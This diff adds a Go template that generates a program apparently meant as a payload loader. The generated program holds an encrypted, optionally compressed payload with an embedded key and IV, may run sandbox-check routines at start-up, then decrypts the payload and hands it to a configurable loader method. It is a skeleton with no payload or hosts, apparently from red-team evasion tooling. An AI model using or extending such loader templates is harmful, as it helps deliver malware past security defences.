@@ -1,0 +1,50 @@
+{{- define "Local" -}}
+{{- with .Local.BaseCtx -}}
+package main
+
+import (
+    {{- if .Loader}}
+    "{{.Loader.Import}}"{{- end}}
+    {{- if .Crypto}}
+    "{{.Crypto.Import}}"{{- end}}
+    {{- if .Sandbox}}
+    "{{.Sandbox.Import}}"{{- end}}
+    {{- if .Compress}}
+    "{{.Compress.Import}}"{{- end}}
+)
+
+{{- if .Sandbox}}
+func init() {
+    {{- range .Sandbox.Methods}}
+    {{.}}()
+    {{- end}}
+}
+{{- end -}}
+{{end}}
+
+func main() {
+    {{- if .Local.KeyVar}}
+    {{.Local.KeyVar}} := []byte("{{.Local.KeyValue}}")
+    {{- end}}
+    {{- if .Local.IVVar}}
+    {{.Local.IVVar}} := []byte("{{.Local.IVValue}}")
+    {{- end}}
+
+    {{.Local.BaseCtx.Payload.CipherText}} := "{{.Local.Payload}}"
+
+    {{if .Local.BaseCtx.Compress -}}
+    {{.Local.BaseCtx.Payload.CipherText}}, _ = {{.Local.BaseCtx.Compress.Algorithm}}(
+        {{.Local.BaseCtx.Payload.CipherText}},
+        {{if .Local.BaseCtx.Compress.Ratio}}{{.Local.BaseCtx.Compress.Ratio}},{{end}}
+    )
+    {{- end}}
+
+    {{.Local.BaseCtx.Payload.PlainText -}}, _ := {{.Local.BaseCtx.Crypto.Decrypt}}(
+        {{.Local.BaseCtx.Payload.CipherText}},
+        {{if .Local.KeyValue}} {{.Local.KeyVar}},{{end}}
+        {{if .Local.IVValue}} {{.Local.IVVar}},{{end}}
+    )
+
+    {{.Local.BaseCtx.Loader.Method}}({{.Local.BaseCtx.Payload.PlainText}})
+}
+{{- end -}}
